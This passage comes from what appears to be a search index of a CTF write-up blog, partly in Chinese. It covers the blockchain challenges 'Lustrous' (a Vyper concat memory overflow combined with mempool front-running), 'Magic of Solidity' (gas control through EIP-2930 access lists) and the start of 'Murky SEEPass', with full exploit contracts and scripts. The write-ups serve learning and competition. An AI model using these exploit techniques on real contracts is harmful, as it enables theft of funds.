DESTROYED","title":"Description"},{"location":"blockchain/lustrous/#solution","text":"Initially, there are 1,000,000 ether deposited into the contract, which we have to drain and solve the challenge. Only the battle() function in the contract can obtain ether The battle has three stages, each corresponding to a lunarian with different health and attack power. At each stage, if gem is still active and has more health than the lunarian after all rounds are over, the corresponding stage funds will go to us. Getting 1 or 2 ether each time has little effect, while the instance will automatically terminate in 10 minutes. Obviously, we have to win stage 2 1 2 3 4 5 6 7 8 9 10 11 if self . gems [ gem_id ] . status == GemStatus . ACTIVE \\ and ( lunarian . health <= 0 or lunarian . health < self . gems [ gem_id ] . health ): if self . stage == 0 : send ( self . master_addr , as_wei_value ( 1 , \"ether\" )) self . stage += 1 elif self . stage == 1 : send ( self . master_addr , as_wei_value ( 2 , \"ether\" )) self . stage += 1 elif self . stage == 2 : send ( self . master_addr , self . balance ) # congratz :) The winner of each round in a stage is determined by lunarian_actions array and an array returned by master.get_actions() . We don't have permission to call the battle() function, but we can obtain lunarian_actions from the pending transaction. Then, front run the transaction of battle() to set gem_actions and win each round as desired :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @external def battle ( lunarian_actions : DynArray [ uint8 , MAX_ROUNDS ]) -> ( bool , int256 , int256 ): assert self . lunarian_addr == msg . sender , \"only lunarian can start battle\" assert self . master_addr != empty ( address ), \"master not registered\" assert self . stage < STAGES , \"invalid stage\" lunarian : Lunarian = LUNARIANS [ self . stage ] master : Master = Master ( self . master_addr ) gem_actions : DynArray [ uint8 , MAX_ROUNDS ] = master . get_actions () gem_id : bytes32 = self . get_gem_id ( self . master_addr , self . assigned_gems [ self . master_addr ]) ... for r in range ( lunarian . rounds , bound = MAX_ROUNDS ): # rock paper scissors lunarian_action : uint8 = lunarian_actions [ r ] gem_action : uint8 = gem_actions [ r ] assert lunarian_action <= 2 and gem_action <= 2 , \"invalid action\" if lunarian_action == gem_action : continue master_win : bool = ( lunarian_action == 0 and gem_action == 1 ) \\ or ( lunarian_action == 1 and gem_action == 2 ) \\ or ( lunarian_action == 2 and gem_action == 0 ) ... The lunarian in stage 2 has a huge amount of health but the initial attack of the gem is only 255 at most. It costs 1 ether to create a gem, and we only start with 1.5 ether. Even if we can merge gems to increase the attack power of a gem, it is still difficult to win in 300 rounds 1 2 3 4 5 LUNARIANS : constant ( Lunarian [ STAGES ]) = [ Lunarian ({ health : 1_000 , attack : 10_000 , rounds : 100 }), Lunarian ({ health : 10_000 , attack : 100_000 , rounds : 200 }), Lunarian ({ health : 1 << 64 , attack : 1 << 128 , rounds : 300 }), ] A master can have multiple gems. The data of each gem is stored in the contract via gem_id . The gem_id is the hash of master_addr and a sequence number. The get_gem_id() internal function uses the concat built-in function, which is related to a memory buffer overflow vulnerability 1 . That is, if a function calls an internal function that uses concat , the leading bytes of its first declared variable may be overwritten with zeros. In get_gem_id() , sequence_bytes will be mloaded and mstored right after previous copied master_addr_bytes , causing a 20-byte memory buffer overflow 1 2 3 4 5 6 7 @internal @pure def get_gem_id ( master_addr : address , sequence : uint32 ) -> bytes32 : master_addr_bytes : bytes20 = convert ( master_addr , bytes20 ) sequence_bytes : bytes4 = convert ( sequence , bytes4 ) gem_id : bytes32 = keccak256 ( concat ( master_addr_bytes , sequence_bytes )) return gem_id During the battle, if the gem is not in an active health, master.decide_continue_battle will be called, giving us the opportunity to merge gems and get a gem with negative health. By combining the vulnerability of concat , we can obtain a gem with high health to win the battle ;) 1 2 3 4 5 6 7 8 9 10 11 12 13 @external def merge_gems () -> Gem : ... gem : Gem = Gem ({ health : gem1 . health + gem2 . health , max_health : gem1 . max_health + gem2 . max_health , attack : gem1 . attack + gem2 . attack , hardness : ( gem1 . hardness + gem2 . hardness ) / 2 , status : self . calc_status ( gem1 . health + gem2 . health ), }) self . gems [ self . get_gem_id ( msg . sender , self . sequences [ msg . sender ] - 2 )] = gem self . sequences [ msg . sender ] -= 1 return gem","title":"Solution"},{"location":"blockchain/lustrous/#exploitation","text":"The exploitation steps are as follows: Create gem0 with a favorable attack value and win stage 0 with it Create gem1 with a favorable health and draw stage 1 to reset stage to 0 without losing any health Intentionally lose stage 0 with gem1 to make its status inactive Win stage 0 with gem0 In stage 1, gem0 's health can go negative with only one attack. During the master.decide_continue_battle() , gem0 is still active and can pass the status check in merge_gems() along with gem1 . After merging, gem0 has enough health to win stage 1 and 2 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 contract Master { int256 constant ACTIVE_HEALTH_THRESHOLD = 64 ; ILandOfTheLustrous land ; uint8 [] actions ; bool canMerge ; constructor ( ILandOfTheLustrous _land ) { land = _land ; _land . register_master (); } function first () external payable { int256 random = int256 ( uint256 ( keccak256 ( abi . encode ( block.number )))); if ( random < 0 ) { random = - random ; } require (( random / 256 ) % 256 >= 10 ); land . create_gem { value : 1 ether }(); land . assign_gem ( 0 ); } function second () external { int256 random = int256 ( uint256 ( keccak256 ( abi . encode ( block.number )))); if ( random < 0 ) { random = - random ; } int256 health = random % 256 ; if ( health < ACTIVE_HEALTH_THRESHOLD ) { health = ACTIVE_HEALTH_THRESHOLD ; } int256 hardness = ( random / ( 256 * 256 )) % 256 ; while ( health >= ACTIVE_HEALTH_THRESHOLD ) { health -= 10 _000 / hardness ; } require ( health >= 0 ); land . create_gem { value : 1 ether }(); land . assign_gem ( 1 ); } function third () external { land . assign_gem ( 0 ); canMerge = true ; } function set_actions ( uint8 [] memory lunarian_actions , uint256 start , uint8 draw ) external { uint256 len = lunarian_actions . length ; uint8 [] memory _actions = new uint8 []( len ); for ( uint256 i ; i < start ; i ++ ) { _actions [ i ] = ( lunarian_actions [ i ] + 2 + draw ) % 3 ; } for ( uint256 i = start ; i < len ; i ++ ) { _actions [ i ] = ( lunarian_actions [ i ] + 1 ) % 3 ; } actions = _actions ; } function get_actions () external view returns ( uint8 [] memory ) { return actions ; } function decide_continue_battle ( uint256 , int256 ) external returns ( bool ) { if ( canMerge ) { land . merge_gems (); } return true ; } receive () external payable {} } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 import pwn import hashlib import time from typing import Callable from threading import Thread from cheb3 import Connection from cheb3.utils import load_compiled , decode_data def connect (): return pwn . remote ( \"lustrous.chal.hitconctf.com\" , 31337 ) def solve_pow ( p ): cmd = p . recvline_contains ( b \"python3\" ) . decode () . strip () . split ( \" \" ) preimage_prefix = cmd [ - 2 ] . encode () bits = int ( cmd [ - 1 ]) for i in range ( 0 , 1 << 32 ): your_input = str ( i ) . encode () preimage = preimage_prefix + your_input digest = hashlib . sha256 ( preimage ) . digest () digest_int = int . from_bytes ( digest , \"big\" ) if digest_int < ( 1 << ( 256 - bits )): ans = your_input break p . sendlineafter ( b \"YOUR_INPUT =\" , ans ) def do_battle (): p = connect () p . sendlineafter ( b \"action?\" , b \"3\" ) solve_pow ( p ) p . sendlineafter ( b \"uuid please:\" , uuid ) time . sleep ( 5 ) p . close () def frontrun ( handler : Callable ) -> bool : pending_filter = conn . w3 . eth . filter ( 'pending' ) battle_thread = Thread ( target = do_battle , args = []) battle_thread . start () while True : pending_entries = pending_filter . get_new_entries () if pending_entries != []: print ( \"[+] Frontrunning\" ) for txn_hash in pending_entries : txn = conn . w3 . eth . get_transaction ( txn_hash ) if txn [ 'to' ] == land_addr : decoded_input = decode_data ( txn [ 'input' ][ 4 :], [ \"uint8[]\" ]) handler ( decoded_input , txn [ 'gasPrice' ]) return True if not battle_thread . is_alive (): print ( \"[-] Frontrun failed\" ) return False def frontrun_handler ( lunarian_actions : list [ int ], gas_price : int ): master . functions . set_actions ( lunarian_actions , start_index , to_draw ) . send_transaction ( gas_price = gas_price + 100 ) p = connect () p . sendlineafter ( b \"action?\" , b \"1\" ) solve_pow ( p ) uuid = p . recvline_contains ( b \"uuid:\" ) . split ( b \" \" )[ - 1 ] print ( f \" { uuid = } \" ) conn = Connection ( p . recvline_contains ( b \"rpc endpoint:\" ) . decode () . split ( \" \" )[ - 1 ]) account = conn . account ( p . recvline_contains ( b \"private key:\" ) . decode () . split ( \" \" )[ - 1 ]) land_addr = p . recvline_contains ( b \"challenge contract:\" ) . decode () . split ( \" \" )[ - 1 ] land_abi , _ = load_compiled ( \"ILandOfTheLustrous.sol\" ) land = conn . contract ( account , abi = land_abi , address = land_addr ) master_abi , master_bin = load_compiled ( \"PoC.t.sol\" , \"Master\" ) master = conn . contract ( account , abi = master_abi , bytecode = master_bin ) master . deploy ( land_addr ) while True : try : master . functions . first () . send_transaction ( value = int ( 1e18 )) break except : continue start_index , to_draw = 0 , 0 frontrun ( frontrun_handler ) # win stage 0 while True : try : master . functions . second () . send_transaction () break except : continue start_index , to_draw = 200 , 1 frontrun ( frontrun_handler ) # draw stage 1 start_index , to_draw = 100 , 0 frontrun ( frontrun_handler ) # lose stage 0 master . functions . third () . send_transaction () start_index = 0 frontrun ( frontrun_handler ) # win stage 0 start_index = 1 frontrun ( frontrun_handler ) # lose -> merge -> win stage 1 start_index = 0 frontrun ( frontrun_handler ) # win stage 2 print ( \"solved?\" , land . caller . is_solved ()) if land . caller . is_solved (): p = connect () p . sendlineafter ( b \"action?\" , b \"4\" ) p . sendlineafter ( b \"uuid please:\" , uuid ) p . interactive ()","title":"Exploitation"},{"location":"blockchain/lustrous/#flag","text":"hitcon{f1y_m3_t0_th3_m00n_3a080ea144010d74}","title":"Flag"},{"location":"blockchain/lustrous/#appendix","text":"By checking the author's writeup , there is another vulnerability 2 that is also expected to be utilized Argument(s) is (are) encoded as a tuple. The ABI encoding of a tuple consists of two areas: the statically encoded head and the dynamically encoded tail . For dynamic types, the head contains the offset of the location within the tail where the data is stored Prior to Vyper 0.4.0, the ABI decoder does not have a buffer overflow check for dynamic offsets. To decode data containing dynamic types, the decoder will retrieve the actual data with the offset information and the raw data location in the memory Vyper stores all variables in memory, including primitives Take _abi_decode(x, Bytes[32]) as an example. Assume that the variable x is stored in memory starting from 0x140. According to the specified type, the decoder will get the actual data position by calculating offset+0x160 . In this example, the bytes string data is stored in memory starting from 0x180 (0x20+0x160) 1 2 3 4 0x140 0x0000000000000000000000000000000000000000000000000000000000000060 [length] 0x160 0x0000000000000000000000000000000000000000000000000000000000000020 [encoded bytes - offset] 0x180 0x0000000000000000000000000000000000000000000000000000000000000003 [encoded bytes - length] 0x1a0 0x666f6f0000000000000000000000000000000000000000000000000000000000 [encoded bytes - data] By setting the offset to a value that causes the position calculation to overflow, it is possible to decode arbitrary data in the memory. In the above example, we can set the offset to 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa0 to decode data located at 0x100 In this challenge, we can let master.get_actions() return a byte string containing a specific offset to achieve the purpose of copying the lunarian's actions without front-running","title":"Appendix"},{"location":"blockchain/lustrous/#references","text":"The Vyper Compiler - by jtriley.eth concat built-in can corrupt memory \u00b7 Advisory \u00b7 vyperlang/vyper \u21a9 _abi_decode Memory Overflow \u00b7 Advisory \u00b7 vyperlang/vyper \u21a9","title":"References"},{"location":"blockchain/magic_of_solidity/","tags":["ethereum","evm","access list"],"text":"#ethereum #evm #access list .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 Are you a sorcerer? Cast your magic and retrieve the flag. Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.9 ; /** * * , /) /) , /) , * ___ _ _ _ ___// _ ___// _(/ _/_ * // (_(_(_(_/__(_(__ (_)/(_ /_)_(_)(/__(_(_(__(_(__(_/_ * .-/ /) .-/ * (_/ (/ (_/ * * @author jinu.eth < https://twitter.com/lj1nu > */ import { CrackMe } from \"./CrackMe.sol\" ; contract Challenge { bool public isSolved ; constructor () { isSolved = false ; } function solve () public { bytes32 salt = keccak256 ( abi . encodePacked ( block . number )); uint gasInput = gasleft () / 1500 ; uint sum = 1 ; for ( uint i = 1 ; i <= 11 ; i ++ ){ salt = keccak256 ( abi . encodePacked ( salt , sum )); CrackMe answ = new CrackMe { salt : salt }(); try answ . getValue { gas : gasInput }( i ) returns ( uint256 value ) { sum *= ( sum + value ); } catch ( bytes memory ) { } } require ( sum == 0x997fecf7193572c88c27ea9af4653249258 ); isSolved = true ; } } CrackMe.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.9 ; contract CrackMe { uint a0 ; uint a1 ; mapping ( uint => uint ) public c ; constructor () { a0 = block . number ; a1 = block . chainid ; } function getValue ( uint n ) public view returns ( uint ) { return n + a0 * a1 * c [ a0 ] * c [ a1 ] * c [ a0 + a1 ] + c [ a0 / a1 ]; } function setValue ( uint offset , uint value ) public { c [ offset ] = value ; } } \u89e3\u9898\u601d\u8def \u00b6 \u5728\u51fd\u6570 solve() \u7684\u6267\u884c\u671f\u95f4\uff0c\u6ca1\u6709\u53d7\u63a7\u51fd\u6570\uff0c\u56e0\u6b64\u65e0\u6cd5\u8c03\u7528 CrackMe \u7684 setValue() \u51fd\u6570\uff0c\u6620\u5c04 c \u4e2d\u7684\u503c\u5c06\u59cb\u7ec8\u4e3a 0 \u4f46 0x997fecf7193572c88c27ea9af4653249258 \u6070\u597d\u662f\u4ec5 \\(2,3,5,6,7,9,11\\) \u53c2\u4e0e\u8ba1\u7b97\u80fd\u591f\u53d6\u5f97\u7684\u7ed3\u679c\uff0c\u56e0\u6b64\uff0c\u4e0d\u9700\u8981\u8bbe\u7f6e CrackMe \u4e2d\u6620\u5c04 c \u7684\u503c\uff0c\u800c\u662f\u9700\u8981\u8c03\u8282 gas \u4f7f\u5f97 answ.getValue() \u800c\u51fd\u6570 solve() \u4e2d\uff0c\u6bcf\u6b21\u8c03\u7528 answ.getValue() \u8bbe\u7f6e\u7684 gas \u503c\u90fd\u662f\u56fa\u5b9a\u7684 gasInput \u4e3a\u4e86\u51cf\u8f7b EIP-2929 \u5bfc\u81f4\u7684 gas \u8d39\u7528\u589e\u52a0\u6240\u53ef\u80fd\u5e26\u6765\u7684\u98ce\u9669\uff0cEIP-2930 \u4ecb\u7ecd\u4e86\u8bbf\u95ee\u5217\u8868\u3002\u8bbf\u95ee\u5217\u8868\u80fd\u591f\u5c06\u6307\u5b9a\u7684\u5730\u5740\u548c\u5b58\u50a8\u69fd\u52a0\u5165\u5230 accessed_addresses \u548c accessed_storage_keys \u96c6\u5408\u4e2d\uff0c\u5e76\u9884\u4ed8\u51b7\u5730\u5740\u548c\u51b7\u5b58\u50a8\u7684\u9644\u52a0 gas\uff0c\u4ece\u800c\u51cf\u5c11\u6267\u884c\u6240\u9700\u7684 gas \u901a\u8fc7\u8bbf\u95ee\u5217\u8868\u6539\u53d8 answ.getValue() \u6267\u884c\u6240\u9700\u7684 gas\uff0c\u5e76\u5229\u7528 Out of Gas \u548c try-catch \u7ed3\u6784\u6765\u63a7\u5236 sum \u7684\u8ba1\u7b97 \u89e3\u9898\u811a\u672c \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 contract MagicOfSolidityHack { MagicOfSolidity magic ; bool [ 11 ] checkList = [ false , true , true , false , true , true , true , false , true , false , true ]; constructor ( address _magic ) { magic = MagicOfSolidity ( _magic ); } function isSolved () external view returns ( bool ) { return magic . isSolved (); } function _getAddress ( bytes32 salt , uint256 sum ) internal view returns ( bytes32 , address ) { salt = keccak256 ( abi . encodePacked ( salt , sum )); // @note It'll compile to different bytecode in different environments, use the creationCode in the MagicOfSolidity contract bytecode to get this code hash bytes32 h = keccak256 ( abi . encodePacked ( bytes1 ( 0xff ), address ( magic ), salt , bytes32 ( 0x3c8add5ea685c69ff7292af8f866aba3ab2f5cb76a93d58837ba938ed8456b54 ))); return ( salt , address ( uint160 ( uint256 ( h )))); } function getCrackAddress ( uint bn ) external view returns ( address [] memory cracks ) { cracks = new address []( 11 ); bytes32 salt = keccak256 ( abi . encodePacked ( bn )); uint sum = 1 ; for ( uint i = 1 ; i <= 11 ; i ++ ) { ( salt , cracks [ i - 1 ]) = _getAddress ( salt , sum ); if ( checkList [ i - 1 ]) { sum *= ( sum + i ); } } } function exploit ( uint256 bn ) external { require ( bn == block . number ); magic . solve { gas : 15000000 }(); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import os from dotenv import load_dotenv from web3 import Web3 from cheb3 import Connection from cheb3.utils import compile_file load_dotenv ( \"../.env\" ) def get_slot ( key ): return Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ key , 2 ]) . hex () check_list = [ False , True , True , False , True , True , True , False , True , False , True ] conn = Connection ( 'http://challA0.quillctf.kalos.xyz:8545' ) account = conn . account ( os . getenv ( \"PRIVATE_KEY\" )) magic_addr = \"0xc64e9De7D3809074EEFf0d22B058623e047475B9\" hack_abi , hack_bin = compile_file ( \"MagicOfSolidityHack.sol\" , solc_version = \"0.8.9\" , base_path = \"../\" )[ 'MagicOfSolidityHack' ] hack = conn . contract ( account , abi = hack_abi , bytecode = hack_bin ) hack . deploy ( magic_addr ) chain_id = conn . w3 . eth . chain_id block_number = conn . w3 . eth . block_number + 2 addresses = hack . functions . getCrackAddress ( block_number ) . call () slots = [ get_slot ( block_number ), get_slot ( chain_id ), get_slot ( block_number + chain_id ), get_slot ( block_number // chain_id ), ] access_list = [] for i in range ( 11 ): if check_list [ i ]: access_list . append ({ 'address' : addresses [ i ], 'storageKeys' : slots }) while conn . w3 . eth . block_number < block_number : try : hack . functions . exploit ( block_number ) . send_transaction ( gas_limit = 18 * 10 ** 6 , access_list = access_list ) except Exception as e : print ( e ) continue print ( hack . functions . isSolved () . call ()) Flag \u00b6 flag{451c55fb18d8a00027721f45dff19112c52725534465cde0f956fe2e74be7647} \u53c2\u8003\u8d44\u6599 \u00b6 EIP-2930: Optional access lists EIP-2930 - Ethereum access list saving gas on cross-contract","title":"Magic of solidity"},{"location":"blockchain/magic_of_solidity/#_1","text":"Are you a sorcerer? Cast your magic and retrieve the flag. Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.9 ; /** * * , /) /) , /) , * ___ _ _ _ ___// _ ___// _(/ _/_ * // (_(_(_(_/__(_(__ (_)/(_ /_)_(_)(/__(_(_(__(_(__(_/_ * .-/ /) .-/ * (_/ (/ (_/ * * @author jinu.eth < https://twitter.com/lj1nu > */ import { CrackMe } from \"./CrackMe.sol\" ; contract Challenge { bool public isSolved ; constructor () { isSolved = false ; } function solve () public { bytes32 salt = keccak256 ( abi . encodePacked ( block . number )); uint gasInput = gasleft () / 1500 ; uint sum = 1 ; for ( uint i = 1 ; i <= 11 ; i ++ ){ salt = keccak256 ( abi . encodePacked ( salt , sum )); CrackMe answ = new CrackMe { salt : salt }(); try answ . getValue { gas : gasInput }( i ) returns ( uint256 value ) { sum *= ( sum + value ); } catch ( bytes memory ) { } } require ( sum == 0x997fecf7193572c88c27ea9af4653249258 ); isSolved = true ; } } CrackMe.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.9 ; contract CrackMe { uint a0 ; uint a1 ; mapping ( uint => uint ) public c ; constructor () { a0 = block . number ; a1 = block . chainid ; } function getValue ( uint n ) public view returns ( uint ) { return n + a0 * a1 * c [ a0 ] * c [ a1 ] * c [ a0 + a1 ] + c [ a0 / a1 ]; } function setValue ( uint offset , uint value ) public { c [ offset ] = value ; } }","title":"\u9898\u76ee"},{"location":"blockchain/magic_of_solidity/#_2","text":"\u5728\u51fd\u6570 solve() \u7684\u6267\u884c\u671f\u95f4\uff0c\u6ca1\u6709\u53d7\u63a7\u51fd\u6570\uff0c\u56e0\u6b64\u65e0\u6cd5\u8c03\u7528 CrackMe \u7684 setValue() \u51fd\u6570\uff0c\u6620\u5c04 c \u4e2d\u7684\u503c\u5c06\u59cb\u7ec8\u4e3a 0 \u4f46 0x997fecf7193572c88c27ea9af4653249258 \u6070\u597d\u662f\u4ec5 \\(2,3,5,6,7,9,11\\) \u53c2\u4e0e\u8ba1\u7b97\u80fd\u591f\u53d6\u5f97\u7684\u7ed3\u679c\uff0c\u56e0\u6b64\uff0c\u4e0d\u9700\u8981\u8bbe\u7f6e CrackMe \u4e2d\u6620\u5c04 c \u7684\u503c\uff0c\u800c\u662f\u9700\u8981\u8c03\u8282 gas \u4f7f\u5f97 answ.getValue() \u800c\u51fd\u6570 solve() \u4e2d\uff0c\u6bcf\u6b21\u8c03\u7528 answ.getValue() \u8bbe\u7f6e\u7684 gas \u503c\u90fd\u662f\u56fa\u5b9a\u7684 gasInput \u4e3a\u4e86\u51cf\u8f7b EIP-2929 \u5bfc\u81f4\u7684 gas \u8d39\u7528\u589e\u52a0\u6240\u53ef\u80fd\u5e26\u6765\u7684\u98ce\u9669\uff0cEIP-2930 \u4ecb\u7ecd\u4e86\u8bbf\u95ee\u5217\u8868\u3002\u8bbf\u95ee\u5217\u8868\u80fd\u591f\u5c06\u6307\u5b9a\u7684\u5730\u5740\u548c\u5b58\u50a8\u69fd\u52a0\u5165\u5230 accessed_addresses \u548c accessed_storage_keys \u96c6\u5408\u4e2d\uff0c\u5e76\u9884\u4ed8\u51b7\u5730\u5740\u548c\u51b7\u5b58\u50a8\u7684\u9644\u52a0 gas\uff0c\u4ece\u800c\u51cf\u5c11\u6267\u884c\u6240\u9700\u7684 gas \u901a\u8fc7\u8bbf\u95ee\u5217\u8868\u6539\u53d8 answ.getValue() \u6267\u884c\u6240\u9700\u7684 gas\uff0c\u5e76\u5229\u7528 Out of Gas \u548c try-catch \u7ed3\u6784\u6765\u63a7\u5236 sum \u7684\u8ba1\u7b97","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/magic_of_solidity/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 contract MagicOfSolidityHack { MagicOfSolidity magic ; bool [ 11 ] checkList = [ false , true , true , false , true , true , true , false , true , false , true ]; constructor ( address _magic ) { magic = MagicOfSolidity ( _magic ); } function isSolved () external view returns ( bool ) { return magic . isSolved (); } function _getAddress ( bytes32 salt , uint256 sum ) internal view returns ( bytes32 , address ) { salt = keccak256 ( abi . encodePacked ( salt , sum )); // @note It'll compile to different bytecode in different environments, use the creationCode in the MagicOfSolidity contract bytecode to get this code hash bytes32 h = keccak256 ( abi . encodePacked ( bytes1 ( 0xff ), address ( magic ), salt , bytes32 ( 0x3c8add5ea685c69ff7292af8f866aba3ab2f5cb76a93d58837ba938ed8456b54 ))); return ( salt , address ( uint160 ( uint256 ( h )))); } function getCrackAddress ( uint bn ) external view returns ( address [] memory cracks ) { cracks = new address []( 11 ); bytes32 salt = keccak256 ( abi . encodePacked ( bn )); uint sum = 1 ; for ( uint i = 1 ; i <= 11 ; i ++ ) { ( salt , cracks [ i - 1 ]) = _getAddress ( salt , sum ); if ( checkList [ i - 1 ]) { sum *= ( sum + i ); } } } function exploit ( uint256 bn ) external { require ( bn == block . number ); magic . solve { gas : 15000000 }(); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 import os from dotenv import load_dotenv from web3 import Web3 from cheb3 import Connection from cheb3.utils import compile_file load_dotenv ( \"../.env\" ) def get_slot ( key ): return Web3 . solidity_keccak ([ 'uint256' , 'uint256' ], [ key , 2 ]) . hex () check_list = [ False , True , True , False , True , True , True , False , True , False , True ] conn = Connection ( 'http://challA0.quillctf.kalos.xyz:8545' ) account = conn . account ( os . getenv ( \"PRIVATE_KEY\" )) magic_addr = \"0xc64e9De7D3809074EEFf0d22B058623e047475B9\" hack_abi , hack_bin = compile_file ( \"MagicOfSolidityHack.sol\" , solc_version = \"0.8.9\" , base_path = \"../\" )[ 'MagicOfSolidityHack' ] hack = conn . contract ( account , abi = hack_abi , bytecode = hack_bin ) hack . deploy ( magic_addr ) chain_id = conn . w3 . eth . chain_id block_number = conn . w3 . eth . block_number + 2 addresses = hack . functions . getCrackAddress ( block_number ) . call () slots = [ get_slot ( block_number ), get_slot ( chain_id ), get_slot ( block_number + chain_id ), get_slot ( block_number // chain_id ), ] access_list = [] for i in range ( 11 ): if check_list [ i ]: access_list . append ({ 'address' : addresses [ i ], 'storageKeys' : slots }) while conn . w3 . eth . block_number < block_number : try : hack . functions . exploit ( block_number ) . send_transaction ( gas_limit = 18 * 10 ** 6 , access_list = access_list ) except Exception as e : print ( e ) continue print ( hack . functions . isSolved () . call ())","title":"\u89e3\u9898\u811a\u672c"},{"location":"blockchain/magic_of_solidity/#flag","text":"flag{451c55fb18d8a00027721f45dff19112c52725534465cde0f956fe2e74be7647}","title":"Flag"},{"location":"blockchain/magic_of_solidity/#_4","text":"EIP-2930: Optional access lists EIP-2930 - Ethereum access list saving gas on cross-contract","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/murky_seepass/","tags":["smart contract","data validation","merkle proof"],"text":"#smart contract #data validation #merkle proof .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 The SEE team has a list of special NFTs that are only allowed to be minted. Find out which one its allowed! nc win.the.seetf.sg 8546 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./SEEPass.sol\" ; contract Setup { SEEPass public immutable pass ; constructor ( bytes32 _merkleRoot ) { pass = new SEEPass ( _merkleRoot ); } function isSolved () external view returns ( bool ) { return pass . balanceOf ( msg . sender ) > 0 ; } } SEEPass.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.17 ; import \"./MerkleProof.sol\" ; import \"@openzeppelin/contracts/token/ERC721/ERC721.sol\" ; contract SEEPass is ERC721 { bytes32 private _merkleRoot ; mapping ( uint256 => bool ) private _minted ; constructor ( bytes32 _root ) ERC721 ( \"SEE Pass\" , \"SEEP\" ) { _merkleRoot = _root ; } function mintSeePass ( bytes32 [] calldata _proof , uint256 _tokenId ) public { require ( ! hasMinted ( _tokenId ), \"Already minted\" ); require ( verify ( _proof , _merkleRoot , _tokenId ), \"Invalid proof\" ); _minted [ _tokenId ] = true ; _safeMint ( msg . sender , _tokenId ); } function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) public pure returns ( bool ) { return MerkleProof . verify ( proof , root , index ); } function hasMinted ( uint256 _tokenId ) public view returns ( bool ) { return _minted [ _tokenId ]; } } MerkleProof.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; library MerkleProof { // Verify a Merkle proof proving the existence of a leaf in a Merkle tree. Assumes that each pair of leaves and each pair of pre-images in the proof are sorted. function verify ( bytes32 [] calldata proof , bytes32 root , uint256 index ) internal pure returns ( bool ) { bytes32 computedHash = bytes32 ( abi . encodePacked ( index )); require ( root != bytes32 ( 0 ), \"MerkleProof: Root hash cannot be zero\" ); require ( computedHash != bytes32 ( 0 ), \"MerkleProof: Leaf hash cannot be zero\" ); for ( uint256 i = 0 ; i < proof . length ; i ++ ) { bytes32 proofElement = proof [ i ]; if ( computedHash < proofElement ) { // Hash(current computed hash + current element of the proof) computedHash = keccak256 ( abi . encodePacked ( computedHash , proofElement )); } else { // Hash(current element of the proof + current computed hash) computedHash = keccak256 ( abi . encodePacked ( proofElement , computedHash )); } } // Check if the computed hash (root) is equal to the provided root return computedHash == root ; } } \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u901a\u8fc7 mintSeePass() \u83b7\u5f97 NFT \u4f7f\u5f97\u653b\u51fb\u8005\u4f59\u989d\u5927\u4e8e 0 mintSeePass() \u9700\u8981\u63d0\u4f9b MerkleProof \u4ee5\u53ca\u5bf9\u5e94\u7684 _tokenId \uff0c\u800c verify() \u6ca1\u6709\u68c0\u67e5 proof \u6570\u7ec4\u7684\u957f\u5ea6\u662f\u5426\u4e3a 